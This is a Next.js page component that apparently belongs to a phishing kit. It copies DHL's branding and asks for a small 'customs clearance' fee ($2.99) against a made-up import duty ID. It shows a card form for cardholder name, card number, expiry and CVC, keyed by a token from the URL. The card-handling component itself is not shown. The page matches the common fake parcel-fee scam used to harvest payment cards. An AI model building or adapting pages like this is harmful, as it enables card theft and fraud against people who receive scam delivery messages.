import { PaymentCheckout } from './PaymentCheckout'
import { getLanguage, useTranslation } from '@/utils/i18n'

export default async function PaymentPage({ searchParams }: { searchParams: Promise<{ [key: string]: string | undefined }> }) {
    const { token } = await searchParams
    const lang = await getLanguage()
    const t = useTranslation(lang)

    return (
        <div className="w-full max-w-lg bg-white rounded-lg shadow-xl overflow-hidden border border-gray-100">
            {/* DHL Top Accent */}
            <div className="bg-[#D40511] h-2 w-full"></div>

            <div className="p-8 space-y-6">
                <div className="border-b border-gray-200 pb-4 mb-6">
                    <h2 className="text-2xl font-black text-gray-900 tracking-tight uppercase">{t('customs_clearance')}</h2>
                    <p className="text-sm text-gray-500 mt-1">{t('processing_fee')}</p>
                </div>

                <div className="bg-gray-50 p-4 border border-gray-200 rounded-md mb-6 shadow-sm">
                    <div className="flex justify-between items-center mb-2">
                        <span className="text-sm font-semibold text-gray-600">{t('import_duty_id')}</span>
                        <span className="text-sm font-mono font-bold text-gray-800">XA-9021-DE</span>
                    </div>
                    <div className="flex justify-between items-center">
                        <span className="text-sm font-semibold text-gray-600">{t('service_fee')}</span>
                        <span className="text-sm font-black text-[#D40511]">$2.99 USD</span>
                    </div>
                </div>

                <PaymentCheckout token={token!}
                    dict={{
                        cardholder: t('cardholder_name'),
                        cardNumber: t('card_number'),
                        expiry: t('expiry'),
                        cvc: t('cvc'),
                        paySecurely: t('pay_securely')
                    }}
                />
            </div>
        </div>
    )
}
